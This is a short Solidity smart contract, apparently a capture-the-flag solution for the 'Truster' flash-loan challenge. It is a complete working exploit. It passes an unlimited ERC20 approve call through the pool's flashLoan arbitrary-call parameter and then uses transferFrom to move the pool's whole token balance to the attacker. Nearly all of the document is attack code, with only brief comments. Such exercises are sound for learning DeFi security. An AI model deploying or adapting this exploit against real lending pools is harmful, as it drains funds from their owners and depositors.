pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IPool {
    function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data)  external;
}
contract TrusterAttack{
    IPool pool;
    IERC20 immutable token;
    address private attacker;

    constructor(address payable _poolAddress, address _tokenAddress) {
        pool = IPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }


    function attack() external{
        // Aprrove unlimmited sending of pool throught flashLoan_86
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2 ** 256 - 1);
        pool.flashLoan(0, attacker, address(token), data);

        // send all token to the attacker
        uint balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, balance);
    }
}